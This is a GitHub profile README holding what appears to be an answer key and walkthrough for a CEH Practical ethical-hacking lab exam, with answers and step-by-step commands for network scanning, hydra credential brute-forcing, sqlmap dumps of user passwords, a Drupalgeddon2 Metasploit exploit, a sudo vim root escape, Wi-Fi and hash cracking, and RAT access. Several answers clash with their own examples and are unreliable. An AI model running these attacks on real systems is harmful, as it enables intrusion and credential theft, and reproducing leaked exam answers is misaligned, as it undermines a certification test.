- 👋 Hi, I’m @ko12345sdc
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
ko12345sdc/ko12345sdc is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->






======================================================================================
Questions
===========
1. Perform an extensive scan of the target network and identify the Product
Version of the Domain Controller. (Format: NN.N.NNNNN)
Answer: 10.0.20348
nmap --script smb-os-discovery -p 445 <DC-IP-Address>
OS: Windows Server 2022 Datacenter 20348 (Windows 10.0 Build 20348)
-------------------------------------------------------------------------------------------------------
2. While investigating an attack, you found that a Windows web development environment was exploited to gain access to the system. Perform extensive scanning and service enumeration of the target networks and identify the number of mercury services running in the Server. (Format: N)
Answer: 7
Solution:
nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.0/24
Need to Perform the same scan on all three subnets i.e. 10.10.1.0/24, 192.168.0.0/24, 172.20.0.0/24

-------------------------------------------------------------------------------------------------------
3. Identify a machine with RDP service enabled in the 10.10.55.0/24 subnet. 
Crack the RDP credentials for user Jones and obtain a file hide.cfe containing an encrypted image file. 
Decrypt the file and enter the CRC32 value of the image file as the answer. 
Note: Use Jones's password to extract the image file.. (Format: NaaNNNaa)
Answer: 2bb407ea
Solution:
Identify Machines with RDP Enabled
	nmap -p 3389 --open -sV 10.10.55.0/24
Crack RDP Credentials
	hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X
Transfer the File hide.cfe to parrot or windows machine.
Upload the image in this website [https://emn178.github.io/online-tools/crc32_checksum.html] and get the answer

-------------------------------------------------------------------------------------------------------
4. An insider attack involving one of the employee's mobile devices in the
10.10.55.0/24 subnet has been identified. You are assigned to covertly access the user's
device and obtain hidden data in the image file stored. Analyze the image file and extract the
sensitive data hidden in the file and enter the secret code as the answer. (Format: A
AaAaAN)
Answer: C@TcHm$Q2
Solution:
1. Scan the Subnet:
nmap -p 80,443,8080,8443,5228 --open 10.10.55.0/24
2. Connect via ADB (if Android):
adb connect 10.10.55.X:5555
3. Locate and Pull Image File:
adb shell
find /sdcard/ -name "*.jpg" -o -name "*.png"
adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg
4. Extract Hidden Data with Steghide:
steghide extract -sf ceh.jpg
5. Analyze Extracted Data:
cat hidden.txt
-------------------------------------------------------------------------------------------------------
5. Perform a vulnerability scan for the host with IP address 192.168.44.32. What is
the CVE number of the vulnerability with the least severity score? (Format: AAA-NNNNNNNN) Credentials of
OpenVas are given.
Answer: CVE-20071742
Solution:
Guide for Using OpenVas.
Introduction to OpenVAS—A Vulnerability Scanner
Kali Linux provides a tool named the Open Vulnerability Assessment System (OpenVAS) for
vulnerability scanning of the system on a network…
https://infosecwriteups.com/introduction-to-openvas-a-vulnerability-scanner-cd5bf830e2fe
Log in to OpenVAS.
Create a New Target:
Configuration - Targets - New Target.
Set IP to 192.168.44.32 .
Create a New Task:
Scans - Tasks - New Task.
Select target 192.168.44.32 .
Choose scan configuration.
Run the Task:
Start the scan.
View the Report:
Scans - Reports - View the report.
Sort vulnerabilities by severity.
Identify the Least Severe Vulnerability:
Note the CVE number.
-------------------------------------------------------------------------------------------------------
6. Exploit a remote login and command-line execution application on a Linux target
in the 10.10.55.0/24 subnet to access a sensitive file, Netnormal.txt. Enter the content in the
file as the answer. (Format: ANaN*aNaN)
Answer: Q1z9*E7d3
Solution:
Search for ssh port in that subnet
nmap -p 22 --open 10.10.55.0/24
Now login using credentials Marcus:M3rcy@123
ssh Marcus@10.10.55.x
Find the Netnormal.txt
find / -type f -name Netnormal.txt 2> /dev/null
Cat the content and submit the answer
cat Netnormal.txt
-------------------------------------------------------------------------------------------------------
7. An ex-employee of an organization has stolen a vital account credential and
stored it in a file named restricted.txt before leaving the organization. The credential is a ninecharacter alpha￾
numeric string. Enter the credential as the answer. The restricted.txt file has
been identified from the employee's email attachment and stored in the "EH Workstation – 2"
machine in the Documents folder. Note: You have learned that "password" is the key to
extracting credentials from the restricted.txt file. (Format: aaaaa*NNN)
Answer: maddy@777
Solution:
Navigate to the Directory:
Change to the directory where restricted.txt is located. Typically, it's in the Documents folder.
cd ~/Documents
Decrypt Using Stegsnow:
Use stegsnow with the password "password" to extract the hidden credential from restricted.txt .
stegsnow -p password -C restricted.txt output.txt
p password : Specifies the password used for decryption (in this case, "password").
C restricted.txt : The input file from which to extract hidden data.
output.txt : The file where extracted data will be saved.
View the Extracted Credential:
After running the command, the extracted credential should be stored in output.txt . View the content of
output.txt to retrieve the vital account credential.
cat output.txt
Now the output.txt is base64 encoded, Decode it
cat output.txt | base64 -d
# Output
maddy@777
-------------------------------------------------------------------------------------------------------
8. Exploit weak credentials used for SMB service on a Windows machine in the
10.10.55.0/24 subnet. Obtain the file, Sniffer.txt hosted on the SMB root, and enter its content
as the answer. (Format: a*aaNaNNa)
Answer: q$ew2e89a
Solution:
Identify SMB Service:
nmap -p 139,445 --open -sV 10.10.55.0/24
Enumerate SMB Shares:
smbclient -L \\10.10.55.X
Brute-force SMB Credentials:
hydra -L user_list.txt -P password_list.txt 10.10.55.X smb
Access SMB Share:
Assume user and password123 are the valid credentials found.
smbclient \\\\10.10.55.X\\share_name -U user%password123
Retrieve and Read Sniffer.txt:
get Sniffer.txt
cat Sniffer.txt
-------------------------------------------------------------------------------------------------------
9. You used shoulder surfing to identify the username and password of a user on
the Ubuntu machine in the 10.10.55.0/24 network, that is, Marcus and M3rcy@123. Access the
target machine, perform vertical privilege escalation to that of a root user, and enter the
content of the imroot.txt file as the answer. (Format: AANNNN***)
Answer: DT4345$#@
Solution:
SSH into the machine:
ssh marcus@10.10.55.X
Check sudo privileges:
sudo -l
Switch to root if possible:
sudo -i
If sudo for vim is allowed:
sudo vim
Press :
Type :!sh or :!bash
Find the imroot.txt file:
find / -name "imroot.txt" 2>/dev/null
Read the content:
cd /
cat imroot.txt
-------------------------------------------------------------------------------------------------------
10. A disgruntled ex-employee Martin has hidden some confidential files in a folder
"Scan" in a Windows machine in the 10.10.55.0/24 subnet. You can not physically access the
target machine, but you know that the organization has installed a RAT in the machine for
remote administration purposes. Your task is to check how many files present in the Scan
Folder and enter the number of files sniffed by the employee as answer. (Format: N)
Answer: 5
Solution:
Launch the RAT Client and establish a connection to the target machine.
Thief RAT -> Connect to 10.10.55.X -> Authenticate
Use the File Manager to navigate to the "Scan" folder.
Thief RAT -> File Manager -> Navigate to C:\Users\Username\Documents\Scan
Count the number of files in the "Scan" folder.
Thief RAT -> File Manager -> Open "Scan" folder -> Count files
-------------------------------------------------------------------------------------------------------
11. Find PT_LOAD(0) of the malware executable file given.
Answer: 0x08048000
Solution:
Open DIE and load the executable:
File > Open > Select malware.exe
Switch to ELF Tab (if the file is ELF):
Navigate to the ELF tab to see the program headers.
Locate PT_LOAD(0):
Look for the first PT_LOAD entry in the list of program headers.

Record the Virtual Address and Offset:
yamlCopy code
Type: PT_LOAD
Offset: 0x00000000
Virtual Addr: 0x08048000
Physical Addr: 0x08048000
File Size: 0x00002000
Mem Size: 0x00002000
Flags: R E
Align: 0x1000


-------------------------------------------------------------------------------------------------------
12. You are investigating a massive DDoS attack launched against a target at
172.22.10.10. Your objective is to identify the packets responsible for the attack and
determine the least IPv4 packet count sent to the victim machine. The network capture file
"Evil-traffic.pcapng" is saved in the Documents folder of the "EH Workstation – 2" (Windows
11) machine.(Format: NNNNN)
Answer: 00042
Solution:
Open Wireshark and load Evil-traffic.pcapng :
File > Open > Documents > Select Evil-traffic.pcapng .
Apply the display filter:
In the filter bar, type: ip.dst == 172.22.10.10 and press Enter.
Open IPv4 Conversations:
Statistics > Conversations > IPv4 tab.
Sort by Packets:
Click on the Packets column header to sort conversations by packet count.
Identify the least packet count:
Look through the sorted list to find the conversation with the least number of packets sent to 172.22.10.10 .
-------------------------------------------------------------------------------------------------------
13. Perform an SQL injection attack on your target web application
cinema.cehorg.com and extract the password of user Daniel. You have already registered on
the website with credentials Karen/computer. (Format: aaaaaaaaaa)
Answer: qwertyuiop
Solution:
1. Run sqlmap:
Open a terminal and run sqlmap against the vulnerable URL or parameter. For example, if the search field
is vulnerable:
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" --dump
2. Identify the Database and Tables:
Use sqlmap to list the databases:
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" --dbs
Once you identify the database, list its tables:
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name --tables
3. Extract the User Table:
Identify the table containing user information (e.g., users , accounts , etc.):
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name -T users --columns
Dump the data from the relevant columns (e.g., username , password ):
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name -T users -C username,password --dump
Assuming sqlmap successfully extracts the data, the output might look like this:
Database: cinema
Table: users
[2 entries]
+---------+-------------+
| username | password |
+---------+-------------+
| Daniel | qwertyuiop |
| Karen | computer |
+---------+-------------+
-------------------------------------------------------------------------------------------------------
14. Explore the web application at www.cehorg.com and enter the flag's value on
the page with page_id=95. (Format: A**NNAA)
Answer: E^%89RU
Solution:
1. Open the URL:
http://www.cehorg.com/index.php?page_id=95
2. View Page Source:
Right-click on the page and select "View Page Source".
3. Search for the Flag:
Press Ctrl+F (or Cmd+F on Mac) to open the find function.
Type flag or directly search for the pattern A**NNAA .
As an example, you might find a comment like this in the source code:
<!-- The flag is A**23BC -->
-------------------------------------------------------------------------------------------------------
15. Perform vulnerability research and exploit the web application
training.cehorg.com, available at 10.10.55.50. Locate the Flag.txt file and enter its content as
the answer. (Format: AaaNNN)
Answer: Qui957
Solution:
Step 1: Verify the Target
1. Open your Web Browser:
Navigate to http://10.10.55.50 to verify the target is running a Drupal site.
Step 2: Use Metasploit to Exploit the Vulnerability
1. Launch Metasploit:
Open a terminal and start Metasploit Framework by running:
msfconsole
2. Search for the Drupalgeddon2 Exploit:
In the Metasploit console, search for the Drupalgeddon2 module:
search drupalgeddon2
3. Select the Exploit Module:
Use the appropriate module from the search results:
use exploit/unix/webapp/drupal_drupalgeddon2
4. Set the Target and Options:
Set the RHOST to the target IP and any other necessary options:
set RHOST 10.10.55.50
set RPORT 80 # Ensure the port is correct for HTTP
5. Run the Exploit:
Execute the exploit:
run
Step 3: Gain a Shell and Locate the Flag
1. Obtain a Shell:
If the exploit is successful, you will get a shell on the target machine.
2. Navigate the File System:
Use basic Linux commands to navigate and locate the Flag.txt file. Common locations to check are the
web root directory or home directories:
find / -name Flag.txt 2>/dev/null
3. Read the Content of Flag.txt:
Once you locate the Flag.txt file, read its content using:
cat /path/to/Flag.txt
-------------------------------------------------------------------------------------------------------
16. Perform SQL injection attack on a web application, cybersec.cehorg.com,
available at 192.168.44.40. Find the value in the Flag column in one of the DB tables and enter
it as the answer. (Format: *aNNaNAA)
Answer: ^r39d4YI
Solution:
Step 1: Launch sqlmap with Crawl, Level, and Risk Parameters

1. Open a Terminal:
Launch your terminal or command prompt.

2. Run sqlmap with Parameters:
Use sqlmap with the following command to perform an automated SQL injection attack with aggressive crawling, high level, and risk settings:

shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs

Explanation of parameters:
u "http://192.168.44.40" : Specifies the URL of the vulnerable web application.
-crawl=3 : Crawls the website up to depth 3 to discover additional parameters and pages vulnerable to SQL injection.
-level=5 : Sets the level of tests to perform. Higher levels test more thoroughly.
-risk=3 : Sets the risk of tests to perform. Higher risks test more aggressively.

Step 2: Identify the Database and Tables

1. Review the Discovered Databases:
Once sqlmap completes crawling, it will list the databases it discovered. Identify the relevant database containing the Flag column.

2. Select the Target Database:
Choose the database that likely contains the Flag column. This typically involves examining the names or performing additional automated tests using sqlmap.

Step 3: Extract Data from Tables

1. List Tables in the Database:
Use sqlmap to list tables within the identified database:
shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
-tables

2. Dump Data from Relevant Tables:
Once tables are identified, dump data from the tables to search for the Flag column:
shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
T table_name --columns

Identify the column containing the Flag information.

3. Retrieve Data from the Flag Column:
Finally, dump the contents of the Flag column from the identified table:
shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
T table_name -C Flag --dump

Step 4: Retrieve the Flag Value
1. Review the Output:
After executing the final command, sqlmap will display the contents of the Flag column. Look for the value that matches the required format aNNaNAA .

Example Output
Assuming sqlmap identifies the Flag column in the users table and the flag value is Secret123 :

diffCopy code
+------+-----------+
| id | Flag |
+------+-----------+
| 1 | Secret123 |
+------+-----------+
-------------------------------------------------------------------------------------------------------
17. A set of files has been uploaded through DVWA
(
http://192.168.44.32:8080/DVWA). The files are located in the "C:\wamp64\www\DVWA\ECweb\Certified\" directory. Access the files and decode the base64 ciphers to reveal the original message among them. Enter the decrypted message as the answer. You can log into the DVWA using the credentials admin/password. (Format:A**aaa*AA)
Answer: R^*ekk%GJ
Solution:
Access DVWA Web Application:
Open your web browser and navigate to http://192.168.44.32:8080/DVWA .

Log in using the provided credentials:
Username: admin
Password: password

Navigate to the Directory:
Once logged in, navigate to the directory containing the files you want to access:
arduinoCopy code
http://192.168.44.32:8080/DVWA/ECweb/Certified/

Identify Base64 Encoded Files:
Look for files within the directory that appear to be encoded in base64. These files typically have names or extensions that suggest they contain encoded data, such as .txt , .dat , .bin , etc.

Decode Base64 Content:
Download the base64 encoded file(s) to your local machine.
Use a base64 decoding tool or script to decode the contents. You can use various methods depending on your operating system and tools available:

Command Line (Linux/macOS):
shCopy code
cat filename.txt | base64 --decode > decoded.txt

Command Line (Windows, using PowerShell):
powershellCopy code
Get-Content filename.txt | ForEach-Object { [System.Text.Encoding]::UTF8.GetS
tring([System.Convert]::FromBase64String($_)) } > decoded.txt

Online Decoder: Use online tools like CyberChef (https://gchq.github.io/CyberChef/) to decode base64 content directly in your browser.

Decrypted Message:
After decoding the base64 content, the resulting text file will contain the decrypted message.
Format the Answer:
Enter the decrypted message as the answer in the specified format A**aaa*AA .
-------------------------------------------------------------------------------------------------------
18. Analyze the traffic capture from an IoT network located in the Documents
folder of the "EH Workstation – 1" (ParrotSecurity) machine, identify the packet with IoT Publish Message, and enter the topic length as the answer. (Format: N)
Answer: 9
Solution:
Access the Packet Capture File
Open the "EH Workstation – 1" (ParrotSecurity) machine.
Navigate to the Documents folder where the traffic capture file, typically in PCAP or PCAPNG format, is located.

Use Wireshark to Analyze the Capture
Launch Wireshark on the ParrotSecurity machine.
Load the Capture File
Open the traffic capture file (e.g., IoT_traffic_capture.pcapng ) using Wireshark.

Apply Display Filter
To filter packets specifically related to IoT Publish Messages, use a display filter to narrow down the packets:This filter selects MQTT packets where msgtype 3 corresponds to Publish messages in MQTT (MQ Telemetry Transport) protocol, which is commonly used in IoT environments.
mqtt.msgtype == 3

Identify Packet Details
Look through the filtered packets to find an MQTT Publish Message.
Each MQTT Publish message has a topic associated with it.

Determine the Topic Length
Once you locate an MQTT Publish message, examine the topic field.
The topic length is the number of characters or bytes that make up the topic string.

Example Answer
If, for instance, you find an MQTT Publish message with a topic length of 9 characters, such as sensors/temperature , then the answer would be:
Answer: 9
-------------------------------------------------------------------------------------------------------
19. A disgruntled employee of your target organization has stolen the company's
trade secrets and encrypted them using VeraCrypt. The VeraCrypt volume file "Its_File" is stored on the C: drive of the "EH Workstation – 2" machine. The password required to access the VeraCrypt volume has been hashed and saved in the file .txt in the Documents folder in the "EH Workstation – 1" (ParrotSecurity) machine. As an ethical hacker working with the company, you need to decrypt the hash in the Hash2crack.txt file, access the Veracrypt volume, and find the secret code in the file named EC_data.txt. (Format: NA*aNaa**A)
Answer: 7E#r9ee(#U
Solution:
Step 1: Retrieve the Hashed Password

1. Access "EH Workstation – 1" (ParrotSecurity) Machine
Open the ParrotSecurity machine.
Navigate to the Documents folder where Hash2crack.txt is located.

2. Retrieve the Hash
Open Hash2crack.txt and copy the hashed password. The hash is typically represented as a string of characters (e.g., MD5, SHA-256, etc.).

Step 2: Decrypt the Hashed Password
1. Use a Hash Cracking Tool
Use a password cracking tool like John the Ripper, Hashcat, or online hash cracking services to decrypt the hash and reveal the original password.
For example, if using John the Ripper:Replace Raw-MD5 with the appropriate hash format based on the hash type in Hash2crack.txt . rockyou.txt is a common wordlist for password cracking.

shCopy code
john --format=Raw-MD5 --wordlist=rockyou.txt Hash2crack.txt

2. Obtain the Password
Once the tool successfully cracks the hash, note down the decrypted password.

Step 3: Access the VeraCrypt Volume
1. Mount the VeraCrypt Volume
On "EH Workstation – 2" machine, where Its_File is located, open VeraCrypt.
2. Provide the Decrypted Password
Select Its_File and choose the option to mount it.
Enter the decrypted password obtained from Step 2 when prompted by VeraCrypt.
3. Access the Encrypted File

Step 4: Retrieve the Secret Code
1. Locate and Open EC_data.txt
Once mounted, navigate to EC_data.txt within the mounted VeraCrypt volume.
2. Retrieve the Secret Code
Open EC_data.txt and extract the secret code contained within.
Example Answer
If, for instance:
The decrypted password from Hash2crack.txt is SecretPassword123
The secret code found in EC_data.txt is Confidential789
Then, the answer format would be:
Answer: Confid789A
-------------------------------------------------------------------------------------------------------
20. Your organization suspects the presence of a rogue AP in the vicinity. You are
tasked with cracking the wireless encryption, connecting to the network, and setting up a honeypot. The airdump-ng tool has been used, and the Wi-Fi traffic capture named
"W!F!_Pcap.cap" is located in the Documents folder in the "EH Workstation – 1"
(ParrotSecurity) machine. Crack the wireless encryption and enter the total number of
characters present in the Wi-Fi password. (Format: N)
Answer: 9
Solution:

Step 1: Access the Capture File
1. Access "EH Workstation – 1" (ParrotSecurity) Machine
Log in to the ParrotSecurity machine.
Navigate to the Documents folder where W!F!_Pcap.cap is located.

Step 2: Analyze the Capture File
1. Use Aircrack-ng to Crack the Encryption
Aircrack-ng is a tool used for breaking WEP and WPA-PSK keys. Here's how you can proceed with it:

2. Identify the Target Network
Use airodump-ng to list the wireless networks captured in the W!F!_Pcap.cap file:
airodump-ng W!F!_Pcap.cap
Note down the BSSID (MAC address) of the target network and the channel it's operating on.

3. Capture Traffic for the Target Network
Start capturing traffic on the target network to collect data packets:Replace BSSID and CHANNEL with the appropriate values from your network.
airodump-ng --bssid BSSID --channel CHANNEL -w outputfile W!F!_Pcap.cap

4. Crack the Wi-Fi Password
Use aircrack-ng with the captured data to attempt to crack the Wi-Fi password. This step involves using a wordlist file ( rockyou.txt is commonly used) to perform a dictionary attack:Replace /path/to/wordlist.txt with the path to your wordlist file and outputfile-01.cap with the captured file generated by airodump-ng .
aircrack-ng -w /path/to/wordlist.txt outputfile-01.cap

5. Determine the Password Length
Once aircrack-ng successfully cracks the Wi-Fi password, note the length of the password in characters.
Example Answer
If the cracked Wi-Fi password is Password123 , which has 11 characters:
Answer: 11

-------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------




Mock Exam Questions
The following questions have been derived from the input from test takers and will give you an insight what type of Questions are expected in exam and how to go about solving them.

Question-1.   There is a machine running wamp server in the subnet. Provide the IP address of the server.

Tips:-   Scan the entire subnet with -A(aggressive scan) in nmap or use -sV(version flag). You can speed up the scan by specifying port with -p as 8080,80,443.

>>>>>>Suggested lecture: Scanning with nmap



Question-2.  Find the FQDN of the domain controller in the network

Tips:-   Scan the entire subnet with -A(aggressive scan) in nmap. The  FQDN will appear for the server.

>>>>>>Suggested lecture: Scanning with nmap



Question-3.  Identify the machine with smb enabled. Crack the smb credentials for the username given. Access an encrypted file and decode the encrypted file to retrieve the flag.

Tips:-   Scan the entire subnet for open smb ports. You can use the wordlist available on the desktop on Parrot os. Use Hydra to crack it. You can also use Metasploit to crack the password. Use Msfconsole auxiliary/scanner/smb/smb_login . The password for the encoded file is the same. If the file contains a hash, try to decode it.

>>>>>>Suggested lecture: smb enumeration, FTP Exploitation.



Question-4.  There is an Android device in the subnet. Identify the device. Get the files in scan folder. Provide SHA384 hash with the largest of entropy

Tips:-   Scan the entire subnet to identify android device. Use Phoesploit, pull required folder to download files, check the ectropy of all files (Detect it easy tool), and then calculate hash. (hashcalc)

>>>>>>Suggested lectures: Hacking Android Devices with Phonesploit over ADB, Analyze ELF Executable File using Detect It Easy (DIE), Calculating Hashes on Windows with different tools



Question-5.  Perform the vulnerability scan for the given IP address. What is the severe value of a vulnerability that indicates the end of life for a web development language platform?

Tips:-   Use Nessus to scan the target. Nessus will provide all results.

>>>>>>Suggested lectures: -



Question-6.  Exploit a remote login application on a Linux target in the given subnet to access a sensitive file. Enter the content of the file.

Tips:-   Use Hydra to break the password Telnet, login and access the file, and enter the flag

>>>>>>Suggested lectures: FTP Exploitation. telnet exploitation



Question-7.  Analyze the image file to extract the hidden message. Password is given.

Tips:-   Use Open stego to reveal the secret

>>>>>>Suggested lectures: Image Steganography



Question-8.  Exploit weak credentials of FTP. Obtain the hidden file

Tips:-   Use Hydra to break the password, login and access the file, and enter the flag

>>>>>>Suggested lectures: FTP Exploitation.



Question-9.  Escalate privilege on a Linux machine. User-level credentials are given.

Tips:-   Use polkit exploit to get the root access

>>>>>>Suggested lectures: Walkthrough - Escalate Privileges by Exploiting Vulnerability in pkexec



Question-10.  Find a file entry point. File is given

Tips:-   Use DIE(detect it easy) or exeinfo PE tools.

>>>>>>Suggested lectures: Analyze ELF Executable File using Detect It Easy (DIE), Find the Portable Executable (PE) Information of a Malware Executable File



Question-11.  From a pcap file, analyze a DDOS attack and provide the IP address that sent most packets.

Tips:-   Use Wireshark and statistics tab

>>>>>>Suggested lectures: Detect DDOS attack with Wireshark



Question-12.  You are provided a username/password for a website. Use SQL Injection attack to extract the password of another user.

Tips:-   Log in with the given credential. Use cookie to extract the password of a user from the table with sqlmap.

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --dbs    #for Database

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* --tables #for Tables of selected Database

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --colmns #for Column names

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump #dump t

>>>>>>Suggested lectures: SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)



Question-13.  Exploit a web application at www.xxxx.com and enter the flag value from given page.

Tips:-  Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap

sqlmap -r <txt file from burpsuite> -D <database name> --tables

sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns

sqlmap -r <txt file from burpsuite> -D <database name> --dump

sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users

>>>>>>Suggested lectures: SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)



Question-14.  Perform vulnerability research and exploit the target at given site.

Tips:-   Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file upload/ File inclusion vulnerability on DVWA.

>>>>>>Suggested lectures: - DVWA file upload, File Inclusion



Question-15.  Perform SQL injection on a website and extract flag value.

Tips:-   Use sqlmap

>>>>>>Suggested lectures: - SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)



Question-16.  A file is available in a directory with DVWA. Access the file and enter the contents.

Tips:-   Use the file inclusion mechanism to access the file

>>>>>>Suggested lectures: - DVWA  File Inclusion



Question-17.  Analyze IoT traffic from a pcap file. Identify the packet with the publish message and enter the length.

Tips:- Open IOT capture file in wireshark. Filter; MQTT and find length of the packet in the lower pane

>>>>>>Suggested lectures: - Detect IoT traffic



Question-18.  Crack the weak credentials of wifi from a pcap file

Tips:- Use aircrack-ng to crack the password.

$ aircrack-ng '*/target file.cap*' -w */wordlist*

>>>>>>Suggested lectures: - Walkthrough - Perform Wireless Attacks, Crack Wifi with Aircrack



Question-19.  A RAT server is installed on a server. Connect with it and access the file.

Tips:- Scan all ports with nmap (-p-). Look for the unknown ports. Use theef RAT to connect to it.

>>>>>>Suggested lectures: - Create a Trojan Server using Theef RAT Trojan



Question-20.  Decrypt the veracrypt volume

Tips:- Use veracrypt to decrypt the volume.

Use veracrypt to log in the hidden drive

Password is hidden in another machine

open file

decrypt the hash and enter the contents

>>>>>>Suggested lectures: - Disk Encryption Using Veracrypt, Calculating Hashes on Windows with different tools

